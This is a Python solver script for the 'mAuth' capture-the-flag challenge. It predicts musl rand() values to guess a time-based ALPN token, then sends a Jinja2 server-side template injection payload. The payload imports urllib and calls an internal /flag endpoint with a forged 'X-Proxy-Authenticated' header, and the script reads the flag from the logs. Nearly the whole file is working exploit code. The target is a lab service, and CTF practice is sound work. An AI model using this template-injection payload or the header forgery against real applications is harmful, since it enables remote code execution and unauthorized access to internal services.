#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import time
from typing import Iterable

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 9000
TLS_SNI = "challenge.com"


def musl_alpn(window: int) -> str:
    # musl rand(): seed=s-1; seed=6364136223846793005*seed+1; return seed>>33
    seed = (window - 1) & 0xFFFFFFFFFFFFFFFF

    def nxt(x: int) -> int:
        return (6364136223846793005 * x + 1) & 0xFFFFFFFFFFFFFFFF

    seed = nxt(seed)
    r1 = (seed >> 33) & 0xFFFFFFFF
    seed = nxt(seed)
    r2 = (seed >> 33) & 0xFFFFFFFF
    seed = nxt(seed)
    r3 = (seed >> 33) & 0xFFFFFFFF

    return f"ctf-{r1:08x}-{r2:08x}-{r3:08x}"


def alpn_candidates() -> Iterable[str]:
    now_window = int(time.time() // 300)
    # Include a small time-skew window around local time.
    for delta in [0, -1, 1, -2, 2]:
        yield musl_alpn(now_window + delta)


def tls_http_request(host_header: str, path: str, method: str = "GET", body: str = "") -> str:
    body_bytes = body.encode()
    headers = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host_header}",
        "Connection: close",
    ]
    if method == "POST":
        headers.append("Content-Type: text/plain")
        headers.append(f"Content-Length: {len(body_bytes)}")

    request = "\r\n".join(headers) + "\r\n\r\n"

    last_response = ""
    for alpn in alpn_candidates():
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols([alpn])

        with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=TLS_SNI) as tls:
                tls.sendall(request.encode() + body_bytes)
                data = b""
                while True:
                    chunk = tls.recv(4096)
                    if not chunk:
                        break
                    data += chunk

        text = data.decode(errors="replace")
        last_response = text
        if "403 Forbidden" not in text:
            return text

    return last_response


def make_payload(internal_host: str) -> str:
    # Import urllib in-process and call public-app /flag with a forged trusted header.
    return (
        "{{ cycler.__init__.__globals__.__builtins__.__import__('urllib.request', None, None, ['urlopen'])"
        ".urlopen(cycler.__init__.__globals__.__builtins__.__import__('urllib.request', None, None, ['Request'])"
        f".Request('http://{internal_host}:5000/flag', headers={{'X-Proxy-Authenticated':'true'}}))"
        ".read().decode() }}"
    )


def try_extract_flag(internal_host: str) -> str | None:
    tls_http_request("admin.challenge.com", "/clean")
    payload = make_payload(internal_host)
    tls_http_request("challenge.com", "/", method="POST", body=payload)
    logs_resp = tls_http_request("admin.challenge.com", "/logs")
    m = re.search(r"upCTF\{[^}]+\}", logs_resp)
    return m.group(0) if m else None


def main() -> None:
    global TARGET_HOST, TARGET_PORT

    parser = argparse.ArgumentParser(description="mAuth solver")
    parser.add_argument("--host", default=TARGET_HOST, help="Target host/IP")
    parser.add_argument("--port", type=int, default=TARGET_PORT, help="Target TLS port")
    args = parser.parse_args()

    TARGET_HOST = args.host
    TARGET_PORT = args.port

    # Try both common deployment topologies used by this challenge.
    for internal in ("127.0.0.1", "public-app"):
        print(f"[*] Trying internal target: {internal}")
        flag = try_extract_flag(internal)
        if flag:
            print("[+] Flag:", flag)
            return

    print("[!] Flag not found. If remote SNI/host differ, adjust constants in script.")


if __name__ == "__main__":
    main()
